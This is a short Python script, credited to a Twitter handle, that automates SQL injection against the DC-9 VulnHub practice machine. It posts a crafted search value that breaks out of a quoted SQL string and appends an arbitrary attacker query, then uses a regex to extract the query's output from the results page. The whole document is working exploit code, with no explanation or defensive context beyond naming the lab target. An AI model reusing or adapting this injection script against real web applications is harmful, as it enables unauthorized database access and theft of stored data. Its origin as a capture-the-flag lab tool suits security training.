#!/usr/bin/python3
# Coded by twitter: @volshebrer to automate SQL Injection vulnerability exploitation of DC-9 vulnhub machine (Machine Author: Twitter - @DCAU7)
import re
import sys
import requests

try:
    query = sys.argv[1]
except IndexError:
   print('E: Usage <./script.py> <"sql-query">')
else:
    data = { "search": f"Tom'{query}-- --"} 
    # Your DC-9 Machine IP here
    r = requests.post('http://192.168.1.2/results.php', data=data)
    regx = re.compile(r"1<br/>Name: (.*)3<br/>", re.DOTALL)
    try: 
        match = re.search(regx, r.text)
        print(match.group(1))
    except AttributeError:
        print("E: Enter valid SQL Query in double quotes (\"\")")
        print("Example : ./script.py \"SELECT @@version\"")
